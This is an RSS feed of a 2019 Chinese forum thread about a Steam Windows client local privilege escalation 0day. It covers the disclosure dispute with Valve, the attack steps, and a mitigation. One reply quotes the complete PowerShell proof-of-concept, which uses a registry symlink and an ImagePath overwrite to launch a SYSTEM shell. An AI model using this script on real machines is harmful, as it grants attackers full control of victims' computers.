@@ -1,0 +1,354 @@
+<?xml version='1.0' encoding='UTF-8'?>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0">
+  <channel>
+    <title>steam被爆存在安全漏洞，注意安全</title>
+    <link>https://bbs.saraba1st.com/2b/</link>
+    <description>steam被爆存在安全漏洞，注意安全</description>
+    <docs>http://www.rssboard.org/rss-specification</docs>
+    <generator>python-feedgen</generator>
+    <lastBuildDate>Thu, 09 Jul 2020 18:26:03 +0000</lastBuildDate>
+    <item>
+      <title>steam被爆存在安全漏洞，注意安全[0-50]</title>
+      <link>https://bbs.saraba1st.com/2b/thread-1852395-1-1.html</link>
+      <description>steam被爆存在安全漏洞，注意安全&#13;
+来源：https://steamcn.com/t512364-1-1
+&#13;
+昨天在reddit看到的瓜越来越热闹了有没有搞网安的dalao出来分析一哈
+&#13;
+消息来源：reddit
+&#13;
+发现者：Steam Windows Client Local Privilege Escalation 0day
+&#13;
+媒体：Severe local 0-Day escalation exploit found in Steam Client Services
+&#13;
+漏洞本身非常简单。Steam为某些内部目录的安装“Steam Client Service（Steam客户端服务）”服务。任何来自“用户”组的用户都可以启动和停止服务。
+&#13;
+结论是在安装了Steam的Windows电脑上能使用最高权限运行任何程序。
+&#13;
+6月15日，Vasily Kravets通过HackerOne第一次向Valve报告了这个漏洞，6月16日HackerOne的员工评审将报告标记为“不适用”，原因是“攻击需要在用户文件系统的任意位置删除文件”。经过讨论，7月2日HackerOne工作人员确认了漏洞并将其提交给Valve安全团队进行审核。7月20日报告被标记为“不适用”，原因是“攻击需要在用户文件系统的任意位置删除文件” 和“攻击需要物理访问用户设备”。8月7日在初次报告提交的45天后，Vasily Kravets公开了漏洞希望Steam开发人员进行一些安全性改进。
+&#13;
+Vasily Kravets简介
+&#13;
+多年来我一直在寻找漏洞，我想我已经看到了够多，但是有一部分工作我无法理解和接受。这绝对是供应商不愿意接受关于漏洞和问题的信息。我明白，当有人直接告诉你，你犯了一个错误，而且很可能不止一个错误时，这是非常不愉快的。很难从公共渠道确认是否存在问题，工作人员是否做错了什么。但是，我不明白为什么一个漏洞报告会被拒绝。
+&#13;
+Vasily Kravets的猜测
+&#13;
+我对valve感到失望，一家严肃的大公司对安全的重要性发表了令人伤心的言论，同时也让你的电脑失去了防御能力。事实上，Steam允许为您运行的每个程序授予最高权限。
+&#13;
+具有讽刺意味的是，一个启动程序(实际上是为在您的计算机上运行第三方程序而设计的)允许它们默默地获得最高权限。你确定一个由未知开发者制作的垃圾免费游戏会安全吗?你相信90%的折扣不会使你变成一个浑然不知的矿工吗?当然，有些威胁甚至在没有管理员权限的情况下仍然会运行。然而，恶意程序的高权限会显著增加风险——程序可以禁用杀毒软件，在暗处隐藏和更改几乎任何用户的任何文件，甚至窃取私人数据。
+&#13;
+由于Steam的流行，有很多潜在的受害者。2015年，Valve报告称Steam上有1.25亿活跃用户。当然并不是所有的Steam用户都将Windows作为操作系统，但大多数用户都是这样的。一些用户在一台机器上有多个“活动”帐户，但是问题的规模仍然令人印象深刻。
+&#13;
+如果没有巧合，并且是被设计成不安全的会怎么样?如果steam是一种合法的后门呢？给vavle定罪是不可能的，但把所有的事实罗列：
+&#13;
+1) 存在易被利用、可靠、权限高的漏洞。似乎还不止一个，根据这段推文
+&#13;
+2)很容易发现漏洞。我不确定我是不是第一个发现它的人，但我是第一个分析它的人。
+&#13;
+根据reddit网友评论，2015年就有人提交过类似漏洞。
+&#13;
+3）Valve拒绝了关于EoP(权限提升)漏洞和同样漏洞的报告。此外，特别减少了传入报告的范围，以排除EoP(权限提升)报告。
+&#13;
+在我看来，Valve希望这些EoP(权限提升)漏洞出现在软件中。
+&#13;
+这看起来不太好。我不建议删除Steam，但是你应该小心使用它。Valve不关心你的安全，所以你是唯一应该关心的人。
+&#13;
+彩蛋
+&#13;
+在编写本文期间发生了一件非常有趣的事情:
+&#13;
+7月20日-在报告被拒绝后，我通知H1我将在7月30日后公开披露漏洞的细节。
+&#13;
+8月2日-又有一名H1员工出现在帖子中，禁止我泄露。
+&#13;
+本文将在7月30日之前准备好发布(之所以选择这个日期，是因为自最初的漏洞报告发出以来，截止日期为45天)。因此，在我于7月20日发出这条信息的两周后，一个人出现了，他告诉我，我的报告被标记为不适用，他们结束了讨论，不向我提供任何解释。而且，他们不想让我披露他们的漏洞。与此同时，Valve甚至一个字也没有说。不，伙计们，事情不该是这样的。你不尊重我的工作，这就是我不尊重你的原因——我没有理由不发表这份报告。很可能我在H1会因此被禁止，但这不会让我心烦。
+&#13;
+昨天(2019年8月6日)Steam进行了更新。问题没有被修复。
+&#13;
+ars的测试
+&#13;
+1、Demonstrate that I cannot write to C:\Windows\System32\. System error message is in red.
+&#13;
+2、Demonstrate that I cannot arbitrarily monkey around with registry keys under HKLM\CurrentControlSet\Services. System-error message is in red.
+&#13;
+3、Delete the NSIS installer key for Steam (to give myself a target for shenanigans), then recreate it as a symlink to msiserver's registry key. Success in green.
+&#13;
+4、Demonstrate that Steam's NSIS key now points to Windows' msinstaller key. Success in green.
+&#13;
+5、Attempt to modify the msiserver key to run my shenanigans. I haven't started Steam Client Services yet, so this fails. System-error message in red.
+&#13;
+6、Start Steam Client Services, then modify the msiserver key once Steam has helpfully opened it up for me. Success in green.
+&#13;
+7、Start the newly-modified msiserver service. msiserver runs as LOCALSYSTEM, so it successfully creates a file under C:\Windows\System32. Success in green.
+&#13;
+有兴趣的dalao可以在vm跑跑看regln-x64.exe
+&#13;
+Windows 用户帐户控制(uac)从未在此过程中触发，整个过程只需要几分钟。测试没有安装任何Steam游戏，只安装了Steam。
+&#13;
+延伸
+&#13;
+SteamEoP.ps1
+&#13;
+Steam Windows Client Local Privilege Escalation 0day
+&#13;
+Valve-bug bountry program
+&#13;
+The following items are considered out-of-scope for all Valve offerings:
+&#13;
+Hypothetical issues that do not have any practical impact.
+&#13;
+Attacks that require social engineering/phishing.
+&#13;
+Attacks that require physical access to the user’s device.
+&#13;
+Attacks that require the ability to drop files in arbitrary locations on the user's filesystem.
+&#13;
+User enumeration without any further impact.
+&#13;
+Clickjacking without a well-defined security/privacy risk.
+&#13;
+Open redirects or linkfilter bypasses that cannot be leveraged to programmatically exfiltrate sensitive information (e.g., cookies, OAuth tokens, etc.).
+&#13;
+Disclosure of software version numbers (we maintain forks of several tools, and apply security patches accordingly).
+&#13;
+Vulnerabilities reported by use of automated tools/scanners, without accompanying validation / POC.
+&#13;
+Content Spoofing / Text Injection that cannot be leveraged for XSS or sensitive data disclosure.
+&#13;
+Host header injection without a specific proof of concept.
+&#13;
+Self XSS or XSS that affects only out-of-date browsers.
+&#13;
+Denial of Service Attacks.
+&#13;
+Reports against Source Engine tools, e.g. Hammer, Source Filmmaker.
+&#13;
+Reports that require the user to open a crafted game demo file.</description>
+      <content:encoded><![CDATA[<p><b>星野心叶: </b><br>
+<span>steam被爆存在安全漏洞，注意安全</span><br>
+<span>来源：https://steamcn.com/t512364-1-1</span><br>
+<span>昨天在reddit看到的瓜越来越热闹了有没有搞网安的dalao出来分析一哈</span><br>
+<span>消息来源：reddit</span><br>
+<span>发现者：Steam Windows Client Local Privilege Escalation 0day</span><br>
+<span>媒体：Severe local 0-Day escalation exploit found in Steam Client Services</span><br>
+<span>漏洞本身非常简单。Steam为某些内部目录的安装“Steam Client Service（Steam客户端服务）”服务。任何来自“用户”组的用户都可以启动和停止服务。</span><br>
+<span>结论是在安装了Steam的Windows电脑上能使用最高权限运行任何程序。</span><br>
+<span>6月15日，Vasily Kravets通过HackerOne第一次向Valve报告了这个漏洞，6月16日HackerOne的员工评审将报告标记为“不适用”，原因是“攻击需要在用户文件系统的任意位置删除文件”。经过讨论，7月2日HackerOne工作人员确认了漏洞并将其提交给Valve安全团队进行审核。7月20日报告被标记为“不适用”，原因是“攻击需要在用户文件系统的任意位置删除文件” 和“攻击需要物理访问用户设备”。8月7日在初次报告提交的45天后，Vasily Kravets公开了漏洞希望Steam开发人员进行一些安全性改进。</span><br>
+<span>Vasily Kravets简介</span><br>
+<span>多年来我一直在寻找漏洞，我想我已经看到了够多，但是有一部分工作我无法理解和接受。这绝对是供应商不愿意接受关于漏洞和问题的信息。我明白，当有人直接告诉你，你犯了一个错误，而且很可能不止一个错误时，这是非常不愉快的。很难从公共渠道确认是否存在问题，工作人员是否做错了什么。但是，我不明白为什么一个漏洞报告会被拒绝。</span><br>
+<span>Vasily Kravets的猜测</span><br>
+<span>我对valve感到失望，一家严肃的大公司对安全的重要性发表了令人伤心的言论，同时也让你的电脑失去了防御能力。事实上，Steam允许为您运行的每个程序授予最高权限。</span><br>
+<span>具有讽刺意味的是，一个启动程序(实际上是为在您的计算机上运行第三方程序而设计的)允许它们默默地获得最高权限。你确定一个由未知开发者制作的垃圾免费游戏会安全吗?你相信90%的折扣不会使你变成一个浑然不知的矿工吗?当然，有些威胁甚至在没有管理员权限的情况下仍然会运行。然而，恶意程序的高权限会显著增加风险——程序可以禁用杀毒软件，在暗处隐藏和更改几乎任何用户的任何文件，甚至窃取私人数据。</span><br>
+<span>由于Steam的流行，有很多潜在的受害者。2015年，Valve报告称Steam上有1.25亿活跃用户。当然并不是所有的Steam用户都将Windows作为操作系统，但大多数用户都是这样的。一些用户在一台机器上有多个“活动”帐户，但是问题的规模仍然令人印象深刻。</span><br>
+<span>如果没有巧合，并且是被设计成不安全的会怎么样?如果steam是一种合法的后门呢？给vavle定罪是不可能的，但把所有的事实罗列：</span><br>
+<span>1) 存在易被利用、可靠、权限高的漏洞。似乎还不止一个，根据这段推文</span><br>
+<span>2)很容易发现漏洞。我不确定我是不是第一个发现它的人，但我是第一个分析它的人。</span><br>
+<span>根据reddit网友评论，2015年就有人提交过类似漏洞。</span><br>
+<span>3）Valve拒绝了关于EoP(权限提升)漏洞和同样漏洞的报告。此外，特别减少了传入报告的范围，以排除EoP(权限提升)报告。</span><br>
+<span>在我看来，Valve希望这些EoP(权限提升)漏洞出现在软件中。</span><br>
+<span>这看起来不太好。我不建议删除Steam，但是你应该小心使用它。Valve不关心你的安全，所以你是唯一应该关心的人。</span><br>
+<span>彩蛋</span><br>
+<span>在编写本文期间发生了一件非常有趣的事情:</span><br>
+<span>7月20日-在报告被拒绝后，我通知H1我将在7月30日后公开披露漏洞的细节。</span><br>
+<span>8月2日-又有一名H1员工出现在帖子中，禁止我泄露。</span><br>
+<span>本文将在7月30日之前准备好发布(之所以选择这个日期，是因为自最初的漏洞报告发出以来，截止日期为45天)。因此，在我于7月20日发出这条信息的两周后，一个人出现了，他告诉我，我的报告被标记为不适用，他们结束了讨论，不向我提供任何解释。而且，他们不想让我披露他们的漏洞。与此同时，Valve甚至一个字也没有说。不，伙计们，事情不该是这样的。你不尊重我的工作，这就是我不尊重你的原因——我没有理由不发表这份报告。很可能我在H1会因此被禁止，但这不会让我心烦。</span><br>
+<span>昨天(2019年8月6日)Steam进行了更新。问题没有被修复。</span><br>
+<span>ars的测试</span><br>
+<span>1、Demonstrate that I cannot write to C:\Windows\System32\. System error message is in red.</span><br>
+<span>2、Demonstrate that I cannot arbitrarily monkey around with registry keys under HKLM\CurrentControlSet\Services. System-error message is in red.</span><br>
+<span>3、Delete the NSIS installer key for Steam (to give myself a target for shenanigans), then recreate it as a symlink to msiserver's registry key. Success in green.</span><br>
+<span>4、Demonstrate that Steam's NSIS key now points to Windows' msinstaller key. Success in green.</span><br>
+<span>5、Attempt to modify the msiserver key to run my shenanigans. I haven't started Steam Client Services yet, so this fails. System-error message in red.</span><br>
+<span>6、Start Steam Client Services, then modify the msiserver key once Steam has helpfully opened it up for me. Success in green.</span><br>
+<span>7、Start the newly-modified msiserver service. msiserver runs as LOCALSYSTEM, so it successfully creates a file under C:\Windows\System32. Success in green.</span><br>
+<span>有兴趣的dalao可以在vm跑跑看regln-x64.exe</span><br>
+<span>Windows 用户帐户控制(uac)从未在此过程中触发，整个过程只需要几分钟。测试没有安装任何Steam游戏，只安装了Steam。</span><br>
+<span>延伸</span><br>
+<span>SteamEoP.ps1</span><br>
+<span>Steam Windows Client Local Privilege Escalation 0day</span><br>
+<span>Valve-bug bountry program</span><br>
+<span>The following items are considered out-of-scope for all Valve offerings:</span><br>
+<span>Hypothetical issues that do not have any practical impact.</span><br>
+<span>Attacks that require social engineering/phishing.</span><br>
+<span>Attacks that require physical access to the user’s device.</span><br>
+<span>Attacks that require the ability to drop files in arbitrary locations on the user's filesystem.</span><br>
+<span>User enumeration without any further impact.</span><br>
+<span>Clickjacking without a well-defined security/privacy risk.</span><br>
+<span>Open redirects or linkfilter bypasses that cannot be leveraged to programmatically exfiltrate sensitive information (e.g., cookies, OAuth tokens, etc.).</span><br>
+<span>Disclosure of software version numbers (we maintain forks of several tools, and apply security patches accordingly).</span><br>
+<span>Vulnerabilities reported by use of automated tools/scanners, without accompanying validation / POC.</span><br>
+<span>Content Spoofing / Text Injection that cannot be leveraged for XSS or sensitive data disclosure.</span><br>
+<span>Host header injection without a specific proof of concept.</span><br>
+<span>Self XSS or XSS that affects only out-of-date browsers.</span><br>
+<span>Denial of Service Attacks.</span><br>
+<span>Reports against Source Engine tools, e.g. Hammer, Source Filmmaker.</span><br>
+<span>Reports that require the user to open a crafted game demo file.</span><br>
+</p><p><b>星野心叶: </b><br>
+<span> 本帖最后由 星野心叶 于 2019-8-9 17:17 编辑 </span><br>
+<span>steamcn原贴有针对方法</span><br>
+<span>打开控制面板-管理工具-组件服务-服务（本地），找到steam client service,右键属性，启动类型改为禁用。</span><br>
+<span>再补个reddit原文链接吧：https://www.reddit.com/r/Steam/comments/cn3303/steam_windows_client_local_privilege_escalation/</span><br>
+<span>不懂技术，大佬们看看</span><br>
+</p><p><b>RedPig: </b><br>
+<span>星野心叶 发表于 2019-8-9 15:54</span><br>
+<span>steamcn原贴有针对方法</span><br>
+<span>打开控制面板-管理工具-组件服务-服务（本地），找到steam client service,右键属性 ...</span><br>
+<span>没什么用吧, 禁用了steam打开一样要求你不禁用该服务</span><br>
+</p><p><b>精钢魔像: </b><br>
+<span>这个不能算吧</span><br>
+<span>这都算漏洞那编程环境自己就是漏洞了</span><br>
+</p><p><b>boom33: </b><br>
+<span>意思是如果我电脑就我一个人用就没事？</span><br>
+<span>----发送自 STAGE1 App for Android.</span><br>
+</p><p><b>TTAA: </b><br>
+<span>假设有一个恶意软件，或者换个说法，病毒，想利用你的电脑（挖矿、远控），它会面临两个问题：1. 它没有足够的权限来对抗杀毒软件 2. 它很难越过UAC访问用户的数据（对很多数据的访问和改写会触发UAC）。第一个问题的后果是这个程序可能会直接被杀毒软件干掉，第二个问题的后果就是如果被感染者在什么事都没干的情况下电脑莫名其妙自己蹦出一个UAC警告，大部分人应该会点个否（这都能点是就真没救了）</span><br>
+<span>而利用这个漏洞，恶意软件可以首先替换steam service（不触发UAC），然后利用上述过程越权启动强行取得SYSTEM级权限，此时UAC对SYSTEM级应用已经不再生效，接下来恶意程序可以在不惊动用户的情况下直接干掉杀毒软件，然后为所欲为</span><br>
+<span>原贴里看到的，我要不要把安装的几个几块钱的小黄油删了</span><br>
+</p><p><b>膛线: </b><br>
+<span>事实不是早就证明安装steam有会使你的钱包越来越瘪的风险吗？</span><br>
+</p><p><b>cxf5102: </b><br>
+<span>并不意外，因为本来就是一个经常启动时卡死，不加-tcp命令经常连不上服务器，CHROME经常无法网页登录的屑平台。</span><br>
+</p><p><b>wuuuuuud: </b><br>
+<span>看起来要动注册表？动注册表（hklm）本身要触发uac的啊</span><br>
+</p><p><b>精钢魔像: </b><br>
+<span>boom33 发表于 2019-8-9 16:23</span><br>
+<span>意思是如果我电脑就我一个人用就没事？</span><br>
+<span>----发送自 STAGE1 App for Android.</span><br>
+<span>要你的 SteamService.exe 被替换才可能出事</span><br>
+<span>更可能的是steam上架一个有黑客行为的软件，通过steam运行，弹出uac你点了确定，然后这个软件替换SteamService</span><br>
+</p><p><b>Scythe: </b><br>
+<span>比较容易的方式是中间人攻击，方法类似楼上这种，算是比较难以实现的攻击吧</span><br>
+</p><p><b>Mr_DECADE: </b><br>
+<span>那么怎么防范呢</span><br>
+<span>-- 来自 有消息提醒的 Stage1官方 Android客户端</span><br>
+</p><p><b>シャスタ: </b><br>
+<span>如果一个游戏就是挖矿的,那好像也不需要啥权限,能运行,能联网就能挖矿了啊.</span><br>
+</p><p><b>cxf5102: </b><br>
+<span>精钢魔像 发表于 2019-8-9 16:53</span><br>
+<span>要你的 SteamService.exe 被替换才可能出事</span><br>
+<span>更可能的是steam上架一个有黑客行为的软件，通过steam运行， ...</span><br>
+<span>原文可是说，只要你安装了steam，就可以不弹UAC，你这个结论怎么和上面的报道完全不一样？</span><br>
+</p><p><b>丹德里恩: </b><br>
+<span>一般的游戏也不会弹出UAC吧，注意点就好了</span><br>
+</p><p><b>stage111st: </b><br>
+<span>RedPig 发表于 2019-8-9 15:58</span><br>
+<span>没什么用吧, 禁用了steam打开一样要求你不禁用该服务</span><br>
+<span>禁用了依然可以运行steam客户端，只是启动速度慢几秒</span><br>
+</p><p><b>RedPig: </b><br>
+<span>stage111st 发表于 2019-8-9 17:19</span><br>
+<span>禁用了依然可以运行steam客户端，只是启动速度慢几秒</span><br>
+<span>原来是要点“取消”</span><br>
+</p><p><b>Scythe: </b><br>
+<span>cxf5102 发表于 2019-8-9 17:09</span><br>
+<span>原文可是说，只要你安装了steam，就可以不弹UAC，你这个结论怎么和上面的报道完全不一样？ ...</span><br>
+<span>不弹uac的东西在steam的覆盖范围内，范围外还是弹uac，也就是一个变相白名单的事</span><br>
+</p><p><b>heroboy: </b><br>
+<span> 本帖最后由 heroboy 于 2019-8-9 17:24 编辑 </span><br>
+<span>看了一下脚本。</span><br>
+<span>就是修改注册表，让steam client service这个服务的exe，指向你的exe，因为是系统服务，所以就能直接以管理员启动了。</span><br>
+<span>现在纠结的是，这个修改注册表的操作是不是要uac权限，理论上来说是需要的。但是实际情况是，这个修改的方式是用注册表的Symblic link来实现的，这个我不是很清楚要不要管理员权限。如果这样可以的话，是不是任何服务的exe都能在不需要uac的情况下被替换了呢。</span><br>
+<span>大家可以看一下这个脚本：</span><br>
+<span>Write-Host "[*] Installing NTObjectManager..."</span><br>
+<span>install-module NTObjectManager -Scope CurrentUser -Force</span><br>
+<span>import-module NTObjectManager</span><br>
+<span>Write-Host "[*] Removing HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\NSIS"</span><br>
+<span>Remove-Item -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\NSIS"</span><br>
+<span>Write-Host "[*] Creating Registry Symbolic Link from HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\NSIS to HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service"</span><br>
+<span>::CreateSymbolicLink("\Registry\Machine\SOFTWARE\WOW6432Node\Valve\Steam\NSIS",$null, "\REGISTRY\Machine\SYSTEM\CurrentControlSet\Services\Steam Client Service")</span><br>
+<span>Write-Host "[*] Registry Symbolic link created, restarting the Steam Client Service"</span><br>
+<span>Get-Service "Steam Client Service" | Restart-Service</span><br>
+<span>Write-Host "[*] Sleeping 5 seconds"</span><br>
+<span>Start-Sleep 5</span><br>
+<span>Write-Host "[*] DACL on HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service should be overwritten"</span><br>
+<span>Write-Host "[*] Modifying the binPath on the Steam Client Service..."</span><br>
+<span>Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service" -Name "ImagePath" -Value "C:\Windows\System32\cmd.exe /c cmd.exe"</span><br>
+<span>Write-Host "[*] binPath overwritten, restarting the service to trigger EoP. This will error out, just ignore it"</span><br>
+<span>Get-Service "Steam Client Service" | Restart-Service</span><br>
+<span>Write-Host "[*] Done, cmd.exe should now be running as NT AUTHORITY\SYSTEM"其中CreateSymbolicLink代码在：https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/NtKey.cs</span><br>
+</p><p><b>精钢魔像: </b><br>
+<span>cxf5102 发表于 2019-8-9 17:09</span><br>
+<span>原文可是说，只要你安装了steam，就可以不弹UAC，你这个结论怎么和上面的报道完全不一样？ ...</span><br>
+<span>你用steam装游戏应该见过弹uac吧</span><br>
+<span>我哪知道报道是怎么试的</span><br>
+</p><p><b>stage111st: </b><br>
+<span>RedPig 发表于 2019-8-9 17:22</span><br>
+<span>原来是要点“取消”</span><br>
+<span>点了取消到界面完全出现也比不禁用要慢，当然不排除我电脑问题</span><br>
+</p><p><b>cxf5102: </b><br>
+<span>heroboy 发表于 2019-8-9 17:22</span><br>
+<span>看了一下脚本。</span><br>
+<span>就是修改注册表，让steam client service这个服务的exe，指向你的exe，因为是系统服务，所 ...</span><br>
+<span>我在虚拟机运行这个脚本，首先会提示</span><br>
+<span>执行策略更改</span><br>
+<span>执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170</span><br>
+<span>中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?</span><br>
+<span>如果你同意的话，还会提示</span><br>
+<span>需要使用 NuGet 提供程序来继续操作</span><br>
+<span>PowerShellGet 需要使用 NuGet 提供程序“2.8.5.201”或更高版本来与基于 NuGet 的存储库交互。必须在“C:\ProgramFiles\PackageManagement\ProviderAssemblies”或“C:\Users\w4639\AppData\Local\PackageManagement\ProviderAssemblies”中提</span><br>
+<span>供 NuGet 提供程序。也可以通过运行 'Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force' 安装 NuGet提供程序。是否要让 PowerShellGet 立即安装并导入 NuGet 提供程序?</span><br>
+<span>所以至少我不认为这个脚本有什么卵用。</span><br>
+</p><p><b>heroboy: </b><br>
+<span>cxf5102 发表于 2019-8-9 17:43</span><br>
+<span>我在虚拟机运行这个脚本，首先会提示</span><br>
+<span>执行策略更改</span><br>
+<span>调用nuget是为了能用NtApiDotNet.NtKey这个api吧。实际使用会使用编译好的exe就不需要nuget安装包了。主要就是看这个api需不需要uac权限。</span><br>
+</p><p><b>cxf5102: </b><br>
+<span>heroboy 发表于 2019-8-9 17:48</span><br>
+<span>调用nuget是为了能用NtApiDotNet.NtKey这个api吧。实际使用会使用编译好的exe就不需要nuget安装包了。主 ...</span><br>
+<span>在国内垃圾网络下跑了好几次终于安上了包，确实不需要UAC能运行下去</span><br>
+<span>不过这一行以后</span><br>
+<span>Write-Host "[*] binPath overwritten, restarting the service to trigger EoP. This will error out, just ignore it"</span><br>
+<span>PS就会消失，我估计大概是出错了，所以我运行了一下Get-Service "Steam Client Service" | Restart-Service，会出错：</span><br>
+<span>Restart-Service : 由于以下错误无法启动服务“Steam Client Service (Steam Client Service)”: 无法启动计算机“.”上的服务</span><br>
+<span>Steam Client Service。</span><br>
+<span>所在位置 行:1 字符: 38</span><br>
+<span>+ Get-Service "Steam Client Service" | Restart-Service</span><br>
+<span>+                                    ~~~~~~~~~~~~~~~</span><br>
+<span>    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) </span><br>
+<span>   , ServiceCommandException</span><br>
+<span>    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.RestartServiceCommand</span><br>
+<span>于是我试着任务管理器启动该服务（显示已停止），启动不了，大概被搞坏了？顺面一说我新安装的STEAM，没有登陆过。</span><br>
+<span>至此CMD并没有管理员权限，我试着在系统目录下MKDIR但是拒绝访问。</span><br>
+</p><p><b>dogfight: </b><br>
+<span>很多人想要某个程序不弹UAC，用这个可以绕过？</span><br>
+</p><p><b>处男鉴黄师: </b><br>
+<span>这已经算高危的提权漏洞了</span><br>
+</p><p><b>香月诗浓: </b><br>
+<span>这种需要本地执行的，干啥都不奇怪，又不是远程执行或者服务器漏洞</span><br>
+<span>—— 来自 OnePlus ONEPLUS A5010, Android 8.1.0上的 S1Next-鹅版 v2.1.2</span><br>
+</p><p><b>Evilgurren: </b><br>
+<span> 本帖最后由 Evilgurren 于 2019-8-10 02:25 编辑 </span><br>
+<span>算是一个本地提权漏洞，value这做法很不应该，不过正常服务器上是不可能有steam的，主要威胁个人用户</span><br>
+</p><p><b>Pbynessseri: </b><br>
+<span>这里有个矛盾，你要有个游戏有足够多的人运行才有价值，但是有那么多人跑你的游戏，那你还用的着钻这个漏洞？直接买游戏赚钱不就完了??</span><br>
+</p><p><b>好大一只绅士: </b><br>
+<span>偶尔会收到异地验证码,明明从未在网吧用过steam而且刚改过密码</span><br>
+</p><p><b>qwased: </b><br>
+<span>有点脱裤子放屁，win上能这么搞等于攻击者已经坐在你电脑前面了</span><br>
+<span>—— 来自 Xiaomi MI 6, Android 9上的 S1Next-鹅版 v2.1.2</span><br>
+</p><p><b>Herreimu: </b><br>
+<span>Pbynessseri 发表于 2019-8-10 12:06</span><br>
+<span>这里有个矛盾，你要有个游戏有足够多的人运行才有价值，但是有那么多人跑你的游戏，那你还用的着钻这个漏洞 ...</span><br>
+<span>不是，从steam下载只是途径之一</span><br>
+<span>这个漏洞是让恶意程序替换steamclientservices.exe来越过uac获得权限，让你的杀毒软件失效</span><br>
+<span>用大白话来讲，大致是来源可能是浏览器下载，u盘等等，漏洞的作用是让你的杀软不报毒</span><br>
+</p><p><b>chen_null: </b><br>
+<span>本地提权漏洞，从一个安装了Steam的普通用户到SYSTEM权限。这个利用简单，效果显著的漏洞Valve还不修？</span><br>
+</p><p><b>chen_null: </b><br>
+<span>heroboy 发表于 2019-8-9 17:22</span><br>
+<span>看了一下脚本。</span><br>
+<span>就是修改注册表，让steam client service这个服务的exe，指向你的exe，因为是系统服务，所 ...</span><br>
+<span>Steam的BUG，改了某项注册表的修改权限，"HKLM\Software\Wow6432Node\Valve\Steam\Apps "这个键和他的子键的权限都被Steam修改成了用户可修改。所以通过创建链接的形式修改"HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service"这个Service来得到SYSTEM权限。</span><br>
+<span>Service enumerates subkeys of HKLM\Software\Wow6432Node\Valve\Steam\Apps and sets some security descriptions for each.Here I found that HKLM\SOFTWARE\Wow6432Node\Valve\Steam has explicit “Full control” for “Users” group, and these permissions inherit for all subkeys and their subkeys.</span><br>
+</p><p><b>ChrisSnake: </b><br>
+<span>所以以后不要玩不知名的游戏了？</span><br>
+</p><p><b>星野心叶: </b><br>
+<span>ChrisSnake 发表于 2019-8-15 10:28</span><br>
+<span>所以以后不要玩不知名的游戏了？</span><br>
+<span>好像前几天的beta客户端已经修复这问题了</span><br>
+<span>但是阀门对这事的态度真的是...这漏洞据说好几年前就有人发现反映了，但是一直都没修，直到上周闹大了才动起来....</span><br>
+</p>]]></content:encoded>
+      <guid isPermaLink="false">1852395[0-50]</guid>
+    </item>
+  </channel>
+</rss>
